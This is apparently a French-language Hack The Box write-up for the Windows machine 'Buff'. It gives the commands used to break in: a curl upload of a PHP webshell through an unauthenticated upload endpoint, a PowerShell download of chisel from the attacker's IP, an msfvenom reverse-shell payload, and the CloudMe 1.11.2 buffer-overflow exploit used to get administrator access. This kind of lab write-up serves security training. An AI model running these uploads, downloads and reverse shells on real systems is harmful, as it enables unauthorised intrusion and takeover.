# Buff

> **Statut** : [ ] Non commencé | [ ] En cours | [x] Root  
> **OS** : Windows  
> **Difficulté** : Easy  
> **HTB** : https://app.hackthebox.com/machines/263  
> **Difficulté ressentie** : 6/10  
> **IP** : 10.129.4.4  

---

## Reconnaissance

### Nmap

```bash
sudo nmap 10.129.4.4
```

| Port | State | Service |
|------|-------|---------|
| 8080/tcp | open | http-proxy |

### Énumération

**Feroxbuster - scan des répertoires :**

```bash
feroxbuster -u http://10.129.4.4:8080 -w raft-medium-directories.txt -s 200,301,302
```

Répertoires intéressants découverts :
- `/include/` - fichiers PHP inclus
- `/upload/` - répertoire d'upload
- `/profile/` - profils utilisateurs (parse error PHP)
- `/ex/` - erreur DB `secure_login` inexistante
- `/ex/admin/` - 403 Forbidden

**Feroxbuster - scan des fichiers PHP :**

```bash
feroxbuster -u http://10.129.4.4:8080 -w raft-medium-files.txt -s 200,301,302 -x php --no-recursion
```

Fichiers PHP intéressants :
- `index.php` - page d'accueil (Gym Management Software)
- `register.php` - "Only admin allowed"
- `upload.php` - endpoint d'upload
- `up.php` - second endpoint d'upload (notices PHP : `Undefined index: name, ext`)
- `edit.php` / `editp.php` - édition de profil
- `contact.php` / `feedback.php`

**Stack identifiée :** Windows (XAMPP), PHP 7.4.6, Apache 2.4.43, MySQL

**Observations :**
- `/ex/` → `Warning: mysqli::__construct(): (HY000/1049): Unknown database 'secure_login'` dans `C:\xampp\htdocs\gym\ex\include\db_connect.php`
- `/register.php` → 403 "Only admin allowed"

---

## Exploitation

### Vecteur d'attaque

Upload de webshell PHP via `up.php`  - le endpoint accepte un fichier sans aucune validation d'extension ni d'authentification.

### Exploitation

**1. Découverte du endpoint d'upload (`up.php`) :**

```bash
curl -s http://10.129.4.4:8080/up.php
# → Notices PHP : Undefined index: name (line 2) et ext (line 3)
```

**2. Identification du champ file :** le paramètre s'appelle `image`.

```bash
curl -v http://10.129.4.4:8080/up.php \
  -F "image=@-;filename=test.php" <<< '<?php system($_GET["cmd"]); ?>'
# → Erreur move_uploaded_file() vers . → fichier accepté mais name/ext manquants
```

**3. Upload du webshell avec tous les paramètres :**

```bash
curl -v http://10.129.4.4:8080/up.php \
  -F "image=@-;filename=test.php" \
  -F "name=test" \
  -F "ext=php" <<< '<?php system($_GET["cmd"]); ?>'
# → HTTP 200, Content-Length: 0, aucune erreur
```

**4. RCE confirmée :**

```bash
curl -s "http://10.129.4.4:8080/test.php?cmd=whoami"
# → buff\shaun
```

**5. Reverse shell :** upload d'un reverse shell PHP (Ivan Sincek via revshells.com) avec la même méthode `up.php`, puis déclenchement via curl.

---

## Privilege Escalation

### Énumération locale

**systeminfo :**

| Info | Valeur |
|------|--------|
| OS | Windows 10 Enterprise Build 17134 |
| Architecture | x64 |
| Hostname | BUFF |
| Owner | shaun |
| Domain | WORKGROUP |
| Hotfixes | N/A |

**whoami /priv :** pas de privilèges exploitables (SeShutdownPrivilege, SeChangeNotifyPrivilege, SeUndockPrivilege, SeIncreaseWorkingSetPrivilege, SeTimeZonePrivilege  - tous Disabled sauf SeChangeNotifyPrivilege).

**net user :** Administrator, DefaultAccount, Guest, shaun, WDAGUtilityAccount

**Processus intéressants (tasklist) :**

| Processus | PID | Note |
|-----------|-----|------|
| CloudMe.exe | 1872 | CloudMe 1.11.2 |
| httpd.exe | 8272 | Apache (port 8080) |
| mysqld.exe | 8308 | MySQL (port 3306 localhost) |
| MsMpEng.exe | 2916 | Windows Defender actif |

**Ports internes (netstat -ano) :**

| Port | Service | Note |
|------|---------|------|
| 3306 | MySQL | localhost uniquement (PID 8308) |
| 8888 | CloudMe | localhost uniquement |
| 8080 | Apache | exposé (PID 8272) |

### Escalade

**Vecteur :** CloudMe 1.11.2  - buffer overflow (EDB-48389).

**1. Tunnel chisel pour atteindre le port 8888 (localhost uniquement) :**

```bash
# Serveur (attaquant)
chisel server --reverse -p 9999

# Client (box)  - upload chisel.exe via up.php puis transfert avec certutil
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.182:8000/chisel.exe','C:\Users\shaun\Downloads\chisel.exe')"
C:\Users\shaun\Downloads\chisel.exe client 10.10.14.182:9999 R:8888:127.0.0.1:8888
```

**2. Génération du payload :**

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.182 LPORT=5555 -b '\x00\x0A\x0D' -f python -v payload
```

**3. Exploit :** script Python (exploit-db 48389) modifié avec le payload msfvenom, envoyé sur `127.0.0.1:8888` via le tunnel chisel.

```bash
# Listener
nc -lvnp 5555

# Exploit
python3 cloudme_exploit.py
```

**4. Shell administrator obtenu :**

```
C:\Windows\system32>whoami
buff\administrator
```

---

## Flags

- **User** : `9006ac5d************************`
- **Root** : `3940c94a************************`

---

## Leçons apprises

- Upload PHP sans validation : `up.php` accepte n'importe quelle extension, pas d'auth requise
- Les erreurs PHP (`Undefined index`) révèlent les paramètres attendus
- Toujours checker `tasklist` et `netstat -ano` pour trouver des services internes (ici CloudMe sur localhost:8888)
- Chisel pour le port forwarding quand un service n'écoute qu'en local
- CloudMe 1.11.2 : buffer overflow classique, payload via msfvenom + tunnel pour atteindre le port


## Ressources

- [RevShells - generateur de reverse shells](https://www.revshells.com)
- [EDB-48389 - CloudMe 1.11.2 buffer overflow](https://www.exploit-db.com/exploits/48389)
- [Chisel - tunnel TCP/UDP sur HTTP](https://github.com/jpillora/chisel)
- [EDB-48506 - Gym Management System 1.0 - Unauthenticated RCE via file upload](https://www.exploit-db.com/exploits/48506)
- [msfvenom - reference payloads](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/msfvenom.html)
